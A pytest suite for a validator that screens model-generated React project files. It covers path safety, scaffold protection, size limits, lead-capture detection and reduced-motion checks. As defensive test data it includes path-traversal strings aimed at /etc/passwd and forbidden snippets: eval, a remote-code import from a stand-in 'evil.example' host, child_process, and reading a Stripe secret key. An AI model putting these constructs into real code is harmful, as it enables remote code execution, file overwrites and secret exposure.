"""Validation of model-generated project files."""

import pytest

from app.platform.pipeline.validation import (
    MAX_FILE_BYTES,
    GeneratedCodeInvalid,
    respects_reduced_motion,
    uses_decision_runtime,
    uses_lead_capture,
    validate_generated_files,
)

VALID_APP = {
    "path": "src/App.jsx",
    "content": (
        "import React, { useState } from 'react';\n"
        "import { submitLead } from './lib/magnitai.js';\n"
        "export default function App() { const save=()=>submitLead({email:'a@b.co'});"
        " return <button onClick={save}>Save</button>; }\n"
    ),
}


class TestHappyPath:
    def test_accepts_a_well_formed_app(self):
        result = validate_generated_files([VALID_APP])
        assert result[0]["path"] == "src/App.jsx"

    def test_accepts_extra_components(self):
        extra = {"path": "src/ResultCard.jsx", "content": "export default () => null;"}
        assert len(validate_generated_files([VALID_APP, extra])) == 2

    def test_normalizes_leading_dot_slash(self):
        prefixed = {**VALID_APP, "path": "./src/App.jsx"}
        assert validate_generated_files([prefixed])[0]["path"] == "src/App.jsx"

    def test_normalizes_windows_separators(self):
        prefixed = {**VALID_APP, "path": "src\\App.jsx"}
        assert validate_generated_files([prefixed])[0]["path"] == "src/App.jsx"


class TestEntryPoint:
    def test_missing_entry_point_is_rejected(self):
        other = {"path": "src/Other.jsx", "content": "export default () => null;"}
        # Without this the build fails later with a confusing Vite error.
        with pytest.raises(GeneratedCodeInvalid, match="entry point"):
            validate_generated_files([other])

    def test_empty_output_is_rejected(self):
        with pytest.raises(GeneratedCodeInvalid, match="no files"):
            validate_generated_files([])


class TestPathSafety:
    @pytest.mark.parametrize(
        "path",
        [
            "../../../etc/passwd",
            "src/../../escape.jsx",
            "/absolute/App.jsx",
            "src/../../../node_modules/react/index.js",
        ],
    )
    def test_rejects_path_traversal(self, path):
        # Traversal would let generated output overwrite files outside the sandbox,
        # including the shared template's node_modules.
        with pytest.raises(GeneratedCodeInvalid):
            validate_generated_files([{**VALID_APP, "path": path}])

    def test_rejects_files_outside_src(self):
        with pytest.raises(GeneratedCodeInvalid, match="under src/"):
            validate_generated_files([VALID_APP, {"path": "hack.jsx", "content": "x"}])

    @pytest.mark.parametrize(
        "path",
        ["src/main.jsx", "src/index.css", "src/tokens.css", "src/config.js", "src/lib/magnitai.js"],
    )
    def test_rejects_overwriting_scaffold_files(self, path):
        # Overwriting the runtime SDK would let generated code replace the lead
        # submission it is required to call.
        with pytest.raises(GeneratedCodeInvalid, match="scaffold"):
            validate_generated_files([VALID_APP, {"path": path, "content": "x"}])

    @pytest.mark.parametrize("path", ["src/App.tsx", "src/thing.py", "src/data.json", "src/a.html"])
    def test_rejects_unsupported_file_types(self, path):
        with pytest.raises(GeneratedCodeInvalid, match="unsupported"):
            validate_generated_files([VALID_APP, {"path": path, "content": "x"}])

    def test_rejects_duplicate_paths(self):
        with pytest.raises(GeneratedCodeInvalid, match="duplicate"):
            validate_generated_files([VALID_APP, dict(VALID_APP)])


class TestForbiddenPatterns:
    @pytest.mark.parametrize(
        ("snippet", "reason"),
        [
            ("eval('2+2')", "eval"),
            ("new Function('return 1')()", "functions from strings"),
            ("document.write('<p>x</p>')", "document.write"),
            ("<div dangerouslySetInnerHTML={{__html: x}} />", "raw HTML"),
            ("import('https://evil.example/x.js')", "remote code"),
            ("require('child_process')", "Node built-ins"),
            ("const k = process.env.STRIPE_SECRET_KEY", "secrets"),
        ],
    )
    def test_rejects_dangerous_constructs(self, snippet, reason):
        payload = {**VALID_APP, "content": VALID_APP["content"] + snippet}
        with pytest.raises(GeneratedCodeInvalid) as excinfo:
            validate_generated_files([payload])
        assert reason.split()[0].lower() in str(excinfo.value).lower()


class TestSizeLimits:
    def test_rejects_an_oversized_file(self):
        huge = {**VALID_APP, "content": "// " + "x" * (MAX_FILE_BYTES + 1)}
        with pytest.raises(GeneratedCodeInvalid, match="too large"):
            validate_generated_files([huge])

    def test_rejects_too_many_files(self):
        files = [VALID_APP] + [
            {"path": f"src/C{i}.jsx", "content": "export default () => null;"} for i in range(30)
        ]
        with pytest.raises(GeneratedCodeInvalid, match="too many"):
            validate_generated_files(files)

    def test_rejects_empty_content(self):
        with pytest.raises(GeneratedCodeInvalid, match="empty"):
            validate_generated_files([{**VALID_APP, "content": "   "}])

    def test_rejects_malformed_entries(self):
        with pytest.raises(GeneratedCodeInvalid, match="'path' and 'content'"):
            validate_generated_files([{"path": "src/App.jsx"}])


class TestLeadCaptureDetection:
    def test_detects_the_sdk_call(self):
        assert uses_lead_capture([VALID_APP])

    def test_flags_an_app_that_never_captures_a_lead(self):
        # The defect this exists to catch: a beautiful widget that collects nothing
        # is a failed generation, because lead capture is the entire product.
        without = {**VALID_APP, "content": "export default function App() { return <div/>; }"}
        assert not uses_lead_capture([without])

    def test_import_without_call_is_not_enough(self):
        imported = {
            **VALID_APP,
            "content": "import { submitLead } from './lib/magnitai.js'; export default ()=>null;",
        }
        assert not uses_lead_capture([imported])


class TestDecisionRuntimeDetection:
    def test_requires_a_real_runtime_call(self):
        called = {
            **VALID_APP,
            "content": (
                "import { calculateDecision } from './lib/magnitai.js';"
                "const result=calculateDecision({}); export default ()=>result.value;"
            ),
        }
        assert uses_decision_runtime([called])


class TestReducedMotionGate:
    """The system prompt asks every generated app to animate, so the fallback
    cannot be left to chance — it is shipped to every visitor of every customer
    site, and it is one of the few accessibility failures a machine can detect.
    """

    def test_animating_without_a_fallback_is_rejected(self):
        files = [{"content": 'className="transition-transform duration-500"'}]
        assert respects_reduced_motion(files) is False

    def test_tailwind_variant_satisfies_it(self):
        files = [{"content": 'className="transition-transform motion-reduce:transition-none"'}]
        assert respects_reduced_motion(files) is True

    def test_a_hand_written_media_query_satisfies_it(self):
        # An animated counter has to skip the tween, not shorten it, and reading
        # the media query in JS is the only way to do that.
        files = [
            {"content": 'className="transition-opacity duration-300"'},
            {"content": "matchMedia('(prefers-reduced-motion: reduce)')"},
        ]
        assert respects_reduced_motion(files) is True

    def test_an_app_that_never_animates_has_nothing_to_opt_out_of(self):
        assert respects_reduced_motion([{"content": "const total = a + b;"}]) is True

    def test_animate_none_is_not_itself_an_animation(self):
        assert respects_reduced_motion([{"content": 'className="animate-none"'}]) is True
